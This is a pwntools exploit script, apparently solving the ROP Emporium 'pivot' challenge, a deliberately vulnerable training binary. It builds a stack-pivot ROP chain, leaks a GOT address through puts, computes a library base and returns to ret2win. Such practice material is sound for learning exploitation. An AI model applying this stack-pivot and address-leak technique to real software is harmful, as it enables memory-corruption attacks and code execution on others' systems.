from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='i386')
# p = gdb.debug('./pivot', 'b *0x00400ada')
p = process('./pivot')

padding = b'A'*40
ebx_value_ret2win = -0x168d+0x15e7+0xa19
pop_rax = p64(0x00400b00)
xchg_rax_rsp = p64(0x00400b02)

foothold_plt = p64(0x00400850)
foothold_got = p64(0x00602048)
puts_plt = p64(0x00400800)
pop_rdi = p64(0x00400b73)
main = p64(0x00400996)
foothold_offset = 0x00000970
ret2win_offset = 0x00000abe

p.recvuntil("to pivot: ")
pivot = p64(int(p.recv(14),16))

first_chain = padding
first_chain += pop_rax
first_chain += pivot
first_chain += xchg_rax_rsp

second_chain = foothold_plt
second_chain += pop_rdi
second_chain += foothold_got
second_chain += puts_plt
second_chain += main

p.sendline(second_chain)
p.sendline(first_chain)
p.recvuntil('libpivot.so')
foothold_addr = u64(p.recv(6).ljust(8,b'\x00'))
libpivot_base = foothold_addr - foothold_offset
ret2win_addr = p64(libpivot_base + ret2win_offset)

third_chain = padding
third_chain += ret2win_addr

p.sendline(third_chain)

p.recvuntil("smash")
print(p.recvall().decode())
